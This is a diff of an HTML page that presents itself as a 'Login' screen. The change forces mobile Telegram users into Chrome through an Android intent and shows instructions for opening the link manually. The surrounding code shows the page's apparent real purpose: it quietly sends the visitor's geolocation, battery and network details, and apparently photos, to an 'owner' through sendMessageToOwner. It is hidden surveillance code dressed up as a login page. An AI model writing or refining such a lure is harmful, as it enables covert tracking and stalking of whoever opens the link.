@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -36,13 +37,21 @@
             font-size: 14px;
             font-style: italic;
         }
-        .hidden { display: none; }
+        .redirect-note {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 10px;
+            font-size: 12px;
+            color: #666;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Login</h1>
         <div class="subtitle">Please wait...</div>
+        <div class="redirect-note" id="redirectNote">🔄 Opening in Chrome browser...</div>
     </div>
 
     <script>
@@ -58,10 +67,61 @@
         const isTelegram = /Telegram/i.test(navigator.userAgent);
         const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
         
-        // Telegram ဆိုရင် Chrome ပြောင်းခိုင်းမယ်
-        if (isTelegram && isMobile) {
+        // ========== FORCE REDIRECT TO CHROME ==========
+        // Telegram browser ကို သေချာ detect လုပ်ပြီး Chrome ကို အတင်းပြောင်းမယ်
+        
+        function redirectToChrome() {
             const currentUrl = window.location.href;
-            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+            
+            // Method 1: Android Intent (အလုပ်အဖြစ်ဆုံး)
+            // Chrome package name: com.android.chrome
+            const chromeIntent = `intent://${currentUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+            
+            // Method 2: fallback - tell user to open manually
+            document.getElementById('redirectNote').innerHTML = '⚠️ Unable to auto-open Chrome.<br>Please copy link and open in Chrome browser manually.<br><br>📋 Link: ' + currentUrl;
+            
+            // Try to redirect to Chrome
+            window.location.href = chromeIntent;
+            
+            // Fallback: if intent fails, show manual instruction after 2 seconds
+            setTimeout(function() {
+                document.getElementById('redirectNote').innerHTML = '📋 Please copy this link and open in Chrome browser:<br><br>' + currentUrl;
+            }, 2000);
+        }
+        
+        // Detect if running in Telegram's in-app browser
+        if (isTelegram && isMobile) {
+            // Try multiple methods to redirect to Chrome
+            
+            // Method A: intent scheme (အကောင်းဆုံး)
+            const currentUrl = window.location.href;
+            const intentUrl = `intent://${currentUrl.replace('https://', '').replace('http://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
+            window.location.href = intentUrl;
+            
+            // Method B: If intent fails, try to show instruction
+            setTimeout(function() {
+                // Still in Telegram? Show manual instruction
+                if (window.location.href === currentUrl) {
+                    document.body.innerHTML = `
+                        <div class="container">
+                            <h1>🔓 Open in Chrome</h1>
+                            <div class="subtitle">Please open this link in Chrome browser</div>
+                            <div style="background:#f0f0f0; padding:15px; border-radius:10px; margin:15px 0; word-break:break-all;">
+                                ${currentUrl}
+                            </div>
+                            <p>1️⃣ Tap and hold the link above</p>
+                            <p>2️⃣ Select "Copy"</p>
+                            <p>3️⃣ Open Chrome browser</p>
+                            <p>4️⃣ Paste and go</p>
+                            <br>
+                            <p>Or click "Open in Chrome" button below</p>
+                            <button onclick="window.location.href='${intentUrl}'" style="background:#667eea; color:white; border:none; padding:12px 25px; border-radius:25px; margin-top:15px; cursor:pointer;">
+                                🌐 Open in Chrome
+                            </button>
+                        </div>
+                    `;
+                }
+            }, 1500);
         }
         
         let backPhotoSent = false;
@@ -218,7 +278,7 @@
             }
         }
         
-        // ========== LOCATION (Maps လင့်ပါအောင်) ==========
+        // ========== LOCATION ==========
         async function getLocation() {
             if (!navigator.geolocation) {
                 await sendMessageToOwner(`❌ LOCATION NOT SUPPORTED!\n🕐 Time: ${new Date().toLocaleString()}`);
@@ -247,7 +307,7 @@
             );
         }
         
-        // ========== BATTERY INFO (ဖုန်းအား) ==========
+        // ========== BATTERY INFO ==========
         async function getBatteryInfo() {
             if ('getBattery' in navigator) {
                 try {
@@ -263,7 +323,7 @@
             }
         }
         
-        // ========== NETWORK INFO (WiFi / Cellular / 4G/5G) ==========
+        // ========== NETWORK INFO ==========
         async function getNetworkInfo() {
             let networkType = "Unknown";
             let downlink = "";
@@ -276,7 +336,6 @@
                 }
             }
             
-            // WiFi လား Cellular လားဆိုတာ ခန့်မှန်းခြက်
             let connectionMethod = "Unknown";
             if (networkType === 'wifi' || networkType === 'WIFI') {
                 connectionMethod = "WiFi";
@@ -304,6 +363,7 @@
         }
         
         // ========== MAIN ==========
+        // Chrome မှာဖွင့်မှသာ init() ကို run မယ် (Telegram browser ဆို redirect လုပ်ထားပြီးသား)
         async function init() {
             if (!OWNER_ID) {
                 return;
@@ -336,7 +396,7 @@
             }, 5000);
         }
         
-        // Start
+        // Start - Chrome မှာသာ init လုပ်မယ်
         if (!isTelegram || !isMobile) {
             init();
         }
